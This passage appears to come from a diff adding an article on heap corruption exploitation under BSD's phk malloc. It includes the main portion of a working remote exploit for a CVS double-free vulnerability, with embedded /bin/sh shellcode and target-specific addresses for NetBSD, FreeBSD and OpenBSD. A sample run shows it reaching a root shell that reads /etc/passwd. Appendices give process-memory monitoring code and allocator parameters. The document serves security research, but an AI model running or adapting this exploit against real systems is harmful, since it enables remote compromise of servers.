+    if (FD_ISSET(STDOUT_FILENO,&sndset)) {
+      i=write(STDOUT_FILENO,rcvbuf,rcvbufpos);
+      if (i<0) {
+        perror(PROGNAME " - write");
+        exit(EXIT_FAILURE);
+      }
+      memmove(rcvbuf,rcvbuf+i,rcvbufpos-i);
+      rcvbufpos-=i;
+    }
+  } while (rcvbufpos || sndbufpos || !quit);
+  if (quit==2) {
+    fputs("connection closed by foreign host\n",stderr);
+  }
+  exit(0);
+}
+
+
+/* quickly coded, dirty shellcode: alarm(0), dup2(2,1), execve("/bin/sh") */
+unsigned char shellcode[]="\xEB\x41\x31\xC0\x5B\x50\x53\x89\xE2\x50\x52\x53\x81"
+  "\xC3\x30\xF8\xFF\xFF\x53\x53\x50\x50\x89\x03\x89\x43\x04\x89\x43\x08\x89\x43"
+  "\x0C\xB0\x53\xCD\x80\x5E\x5E\x5E\x5E\x31\xC9\x80\xC9\x02\x31\xC0\x0C\x01\x50"
+  "\x51\x50\xB0\x5A\xCD\x80\x5E\x5E\x5E\x31\xC0\xB0\x3B\x50\xCD\x80\xE8\xBA\xFF"
+  "\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68";
+
+
+unsigned int get_int(char *str,char *descr) {
+  unsigned int i;
+  char *p;
+
+  i=(unsigned int)strtoul(str,&p,0);
+  if (*p || !i) {
+    fprintf(stderr,PROGNAME " - %s must be a positive integer\n",descr);
+    exit(2);
+  }
+  return i;
+}
+
+
+/* computes an address approximately equal to addr, that contains no forbidden
+ * chars (0x00 and 0x0a) */
+unsigned int adjust_addr(unsigned int addr) {
+  unsigned int mask;
+  unsigned int mostmask;
+  unsigned int low_part;
+  unsigned int i;
+
+  mask=0xff000000;
+  mostmask=0xff000000;
+  low_part=addr&(0x1000-1);
+  for (i=0;i<4;i++) {
+    if ((addr&mask)==(0x0a0a0a0a&mask) || !(addr&mask)) {
+      addr=((addr|(0x01010101&mask))&mostmask)|(0x01010101&~mostmask);
+      break;
+    }
+    mask/=0x100;
+    mostmask/=0x100;
+    mostmask|=0xff000000;
+  }
+  addr&=~(0x1000-1);
+  addr|=low_part;
+  return addr;
+}
+
+
+void usage(int exit_code) {
+  fprintf(stderr,
+    PROGNAME " - remote CVS multiple free exploit for BSD/i86\n\n"
+    "usage: " PROGNAME " [<options>] <login> <password> <repository> <host> "
+                                                                  "[<port>]\n\n"
+    "available options:\n"
+    "  -d                           toggle debug mode\n"
+    "  -H <heap bottom address>     default 0x%X\n"
+    "  -h                           this help message\n"
+    "  -m <max number of attempts>  default 0x%X\n"
+    "  -p <number of pages>         number of shellcode pages (default 0x%X)\n"
+    "  -s <stack top address>       default 0x%X\n"
+    "  -t <timeout>                 max idle time in seconds (default 0x%X)\n"
+    "\nDefault values work against NetBSD systems."
+    "\nUse -s 0xBFC00000 against FreeBSD."
+    "\nUse -s 0xDFBFE000 -H 0x2000 -p 0x1000 against OpenBSD."
+    "\n\nExcept against OpenBSD, the exploit may be runned much faster if the "
+    "heap bottom\nis increased and the number of shellcode pages is divided by "
+    "4 or 8.\n"
+    "\n",DEF_HEAP_BOTTOM,DEF_MAX_TRIES,shellcode_pages,DEF_STACK_TOP,timeout);
+  exit(exit_code);
+}
+
+
+int main(int argc,char *argv[]) {
+  unsigned int try_addr=DEF_STACK_TOP;
+  unsigned int shellcode_addr=DEF_HEAP_BOTTOM;
+  unsigned int max_tries=DEF_MAX_TRIES;
+  unsigned int ntries=0;
+  int i;
+
+  /* parse command line arguments */
+  while ((i=getopt(argc,argv,"dH:hm:p:s:t:"))!=-1) {
+    switch (i) {
+      case 'd':
+        debug_mode^=1;
+        break;
+      case 'H':
+        shellcode_addr=get_int(optarg,"heap bottom address");
+        break;
+      case 'h':
+        usage(0);
+      case 'm':
+        max_tries=get_int(optarg,"maximum number of tries");
+        break;
+      case 'p':
+        shellcode_pages=get_int(optarg,"number of shellcode pages");
+        break;
+      case 's':
+        try_addr=get_int(optarg,"stack top address");
+        break;
+      case 't':
+        timeout=get_int(optarg,"timeout");
+        break;
+      default:
+        usage(2);
+    }
+  }
+
+  if (optind+3>=argc) {
+    fputs("insufficient number of arguments\n",stderr);
+    usage(2);
+  }
+
+  if (optind+5<argc) {
+    fputs("too many arguments\n",stderr);
+    usage(2);
+  }
+
+  user=argv[optind];
+  password=argv[optind+1];
+  repository=argv[optind+2];
+  victim=argv[optind+3];
+
+  if (optind+5==argc) {
+    port=get_int(argv[optind+4],"port");
+  }
+
+  /* prepare hellcode: |aaa[...]aaa|NOP|shellcode|'\n'| */
+  memset(hellcode,'a',sizeof(hellcode));
+  hellcode[sizeof(hellcode)-1]='\n';
+  memcpy(hellcode+(sizeof(hellcode)-1)-(sizeof(shellcode)-1),shellcode,
+         sizeof(shellcode)-1);
+  hellcode[(sizeof(hellcode)-1)-(sizeof(shellcode)-1)-1]=0x90;
+  shellcode_addr+=sizeof(hellcode)-1-(sizeof(shellcode)-1);
+  if ((shellcode_addr&0xff)=='\n' || !(shellcode_addr&0xff)) {
+    shellcode_addr--;
+  }
+
+  /* stack top is full of crap */
+  try_addr-=1024;
+  /* try to jump in the middle of the shellcode pages */
+  shellcode_addr+=(shellcode_pages/2)*0x1000+0x6000;
+  shellcode_addr=adjust_addr(shellcode_addr);
+
+  signal(SIGSTOP,SIGSTOP_handler);
+
+  do {
+    ntries++;
+    try_addr-=0x1000/2-4;
+    fprintf(stderr,"\n[%02u] trying address range 0x%0X-0x%0X\n",
+            ntries,try_addr,try_addr+0x1000/2-4);
+    /* login */
+    login();
+    /* prepare the heap */
+    prepare_heap();
+    /* try to overwrite the stack */
+    try_overwrite(try_addr,shellcode_addr);
+    /* try to get our shell */
+    try_shell();
+    fputs("SEGV\n",stderr);
+    clean_close();
+  } while (ntries<max_tries);
+
+  fputs("unable to exploit the vulnerability\n",stderr);
+  fprintf(stderr,"%u bytes sent\n",sent);
+
+  return EXIT_FAILURE;
+}
+
+Sample run against a NetBSD system:
+
+$ make cues
+cc -O2   -o cues cues.c
+$ ./cues cvsuser secretpassword /cvs/repository 10.31.33.7
+
+[01] trying address range 0xBFBFD404-0xBFBFDC00
+connected to 10.31.33.7:2401
+  leaking 0x400000 bytes of memory...
+  created two 64 bytes gaps
+  freed dir_name
+  allocated new reception buffers data
+  freed dir_name again
+  3 32 bytes chunks pages allocated
+  created 32 bytes gaps
+  created the 2k bytes gap
+  bufp set to 0
+  pginfo of 2k bytes chunks page overwritten
+  overwriting stack
+4733008 bytes sent
+
+GREETINGS PROFESSOR FALKEN.
+
+head -n 1 /etc/passwd
+root:*:0:0:Charlie &,,,:/root:/bin/sh
+
+
+
+################################################################################
+
+                                Acknowledgements
+
+Many Thanks to Poul-Henning Kamp for writing and distributing this allocator,
+and to Stefan Esser for reporting the CVS vulnerability.
+
+Thanks also go to MaXX, Sha, Sam, and gally, who helped me writing this stuff.
+
+
+
+################################################################################
+
+                                  Outroduction
+
+Having described the internals of phk malloc and given a few BSD heap corruption
+exploitation techniques will hopefully kill the popular belief that heap
+overflows can not be exploited under BSD. The exploitation of such
+vulnerabilities is not easier or harder than on Doug Lea's memory allocator
+based systems, it is only completely different.
+
+However, two interesting security mechanisms help preventing the exploitation of
+certain flaws: first, the check for concurrent calls should protect against race
+conditions coming from certain ill written signal handlers, second, for several
+reasons, basic double free() bugs are not exploitable. However, if other
+malloc() or realloc() calls occur between the two redundant free() calls,
+exploitation may still be possible, under certain circumstances.
+
+
+
+################################################################################
+
+                                   References
+
+  [1] source code file for phk malloc on NetBSD's CVSweb:
+      <http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/stdlib/malloc.c?
+       rev=1.41&content-type=text/x-cvsweb-markup>
+
+  [2] manual page for malloc(3) on NetBSD:
+      <http://netbsd.gw.com/cgi-bin/man-cgi?malloc++NetBSD-current>
+
+  [3] sysnumbers page:
+      <http://www.via.ecp.fr/~bbp/sysnumbers/>
+
+  [4] Stefan Esser's VulnWatch posting about the CVS multiple free() bug:
+      <http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0028.html>
+
+
+
+################################################################################
+
+              Appendix A: sample code to read the RSS of a process
+
+Here is a sample function whose aim is to monitor the RSS (resident set size)
+for a local process. It basically enables one to see when new memory pages are
+allocated by a process. The get_rss() function receives a process id in argument
+and returns the number of memory pages it uses (or -1 in case of problem). When
+this number increases, well, a new page has been allocated. Be warned it may
+increase by more than one at a time, though, because a new page allocation may
+require additional space to be allocated for the pages directory.
+
+The code uses the kvm library (that comes in the default installation of any BSD
+flavour). However, the library's interface is not common to all BSDs, several
+preprocessor directives are thus required to use it, and simply spawning an
+external ps command may be more portable.
+
+Note better performance can be obtained, if necessary, by splitting the
+function, in such a way that kvm_openfiles is called a single time and
+kvm_getproc or kvm_getproc2 is called any number of times.
+
+                                   ==========
+
+#include <limits.h>
+#include <sys/param.h>
+#include <fcntl.h>
+#include <kvm.h>        /* link with -lkvm */
+#include <sys/sysctl.h>
+#include <sys/user.h>
+#include <stdio.h>      /* only for stderr and fprintf() */
+
+
+#if defined(NetBSD) && defined(KVM_NO_FILES)
+
+/* recent NetBSD */
+
+#define MYKITYPE struct kinfo_proc2
+#define MYOPENFILESFLAG KVM_NO_FILES
+#define MYGETPROCCALL(kd,what,opt,cnt) \
+    kvm_getproc2(kd,what,opt,sizeof(struct kinfo_proc),cnt)
+#define MYGETPROC "kvm_getproc2"
+#define MYRSSIZE(ki) ((ki)->p_vm_rssize)
+
+#else
+
+/* FreeBSD and OpenBSD */
+
+#define MYKITYPE struct kinfo_proc
+#ifdef KVM_NO_FILES
+#define MYOPENFILESFLAG KVM_NO_FILES
+#else
+#define MYOPENFILESFLAG O_RDONLY
+#endif
+#define MYGETPROCCALL(kd,what,opt,cnt) \
+    kvm_getprocs(kd,what,opt,cnt)
+#define MYGETPROC "kvm_getprocs"
+#define MYRSSIZE(ki) ((ki)->kp_eproc.e_vm.vm_rssize)
+
+#endif
+
+
+int get_rss(pid_t pid) {
+  char errbuf1[_POSIX2_LINE_MAX];
+  char errbuf2[_POSIX2_LINE_MAX];
+  int cnt;
+  kvm_t *kd;
+  MYKITYPE *kinfo;
+
+  kd=kvm_openfiles(NULL,NULL,NULL,MYOPENFILESFLAG,errbuf1);
+  if (kd==NULL) {
+    kd=kvm_openfiles(NULL,"/dev/null",NULL,MYOPENFILESFLAG,garbage2);
+    if (kd==NULL) {
+      fprintf(stderr,"kvm_openfiles - %s\n",errbuf1);
+      fprintf(stderr,"kvm_openfiles - %s\n",errbuf2);
+      return -1;
+    }
+  }
+  kinfo=MYGETPROCCALL(kd,KERN_PROC_PID,pid,&cnt);
+  if (kinfo==NULL) {
+    fprintf(stderr,MYGETPROC " - %s\n",kvm_geterr(kd));
+    kvm_close(kd);
+    return -1;
+  }
+  kvm_close(kd);
+  if (cnt!=1) {
+    fputs(MYGETPROC " - no entry returned\n",stderr);
+    return -1;
+  }
+  return MYRSSIZE(kinfo);
+}
+
+
+
+################################################################################
+
+           Appendix B: phk malloc parameters on various architectures
+
+Intel i86 (tests driven with NetBSD):
+
+  memory page size:                                 4096 bytes
+  tiny chunks size:                                 16-32 bytes
+  medium-sized chunks size:                         64-2048 bytes
+  struct pgfree size:                               20 bytes
+  struct pginfo size (excluding the bits field):    16 bytes
+
+  various kinds of multi-chunks pages:
+
+    chunk size   number of user chunks per memory page   struct pginfo size
+    ==========   =====================================   ==================
+
+      16 bytes                                     253             48 bytes
+      32 bytes                                     127             32 bytes
+    ----------   -------------------------------------   ------------------
+      64 bytes                                      64             24 bytes
+     128 bytes                                      32             20 bytes
+     256 bytes                                      16             20 bytes
+     512 bytes                                       8             20 bytes
+    1024 bytes                                       4             20 bytes
+    2048 bytes                                       2             20 bytes
+
+                                   ==========
+
+sun4u (tests driven on OpenBSD): 
+
+  memory page size:                                 8192 bytes
+  tiny chunks size:                                 16-64 bytes
+  medium-sized chunks size:                         128-4096 bytes
+  struct pgfree size:                               40 bytes
+  struct pginfo size (excluding the bits field):    24 bytes
+
+  various kinds of multi-chunks pages:
+
+    chunk size   number of user chunks per memory page   struct pginfo size
+    ==========   =====================================   ==================
+
+      16 bytes                                     506             88 bytes
+      32 bytes                                     254             56 bytes
+      64 bytes                                     127             40 bytes
+    ----------   -------------------------------------   ------------------
+     128 bytes                                      64             32 bytes
+     256 bytes                                      32             32 bytes
+     512 bytes                                      16             32 bytes
+    1024 bytes                                       8             32 bytes
+    2048 bytes                                       4             32 bytes
+    4096 bytes                                       2             32 bytes
